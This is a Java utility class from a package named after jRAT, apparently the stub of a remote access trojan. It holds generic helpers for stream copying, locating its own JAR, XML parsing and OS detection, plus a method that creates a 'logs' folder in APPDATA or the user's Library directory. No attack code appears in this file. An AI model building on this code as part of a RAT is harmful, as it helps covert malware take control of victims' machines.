package pro.jrat.stub.utils;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.Reader;
import java.io.StringWriter;
import java.io.Writer;

import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import pro.jrat.stub.Main;



public class Utils {

	private static final byte[] BUFFER = new byte[4096 * 1024];

	public static void copy(InputStream input, OutputStream output) throws Exception {
		int bytesRead;
		while ((bytesRead = input.read(BUFFER)) != -1) {
			output.write(BUFFER, 0, bytesRead);
		}
	}
	
	public static File getJarFile() {
		return new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("file:", ""));
	}

	public static String readString(InputStream is) throws IOException {
		char[] buf = new char[2048];
		Reader r = new InputStreamReader(is, "UTF-8");
		StringBuilder s = new StringBuilder();
		while (true) {
			int n = r.read(buf);
			if (n < 0)
				break;
			s.append(buf, 0, n);
		}
		return s.toString();
	}
	
	public static String getTagValue(String sTag, Element eElement) {
		NodeList nlList = eElement.getElementsByTagName(sTag).item(0).getChildNodes();	 
	    Node nValue = (Node) nlList.item(0); 
		return nValue.getNodeValue();
	}

	public static boolean isOther() {
		String os = System.getProperty("os.name").toLowerCase();
		boolean res = false;
		if (os.contains("win")) {
			res = false;
		} else if (os.contains("mac")) {
			res = false;
		} else if (os.contains("linux")) {
			res = false;
		} else {
			res = true;
		}
		return res;
	}

	public static File getPath() {
		File file = null;
		String os = System.getProperty("os.name").toLowerCase();
		if (os.contains("win")) {
			file = new File(System.getenv("APPDATA") + "\\logs\\");
		} else {
			file = new File(System.getProperty("user.home") + "Library/Application Support/logs/");
		}
		file.mkdirs();
		return file;
	}
	
	public static String getStackTrace(Throwable aThrowable) {
		Writer result = new StringWriter();
		PrintWriter printWriter = new PrintWriter(result);
		aThrowable.printStackTrace(printWriter);
		return result.toString();
	}
}
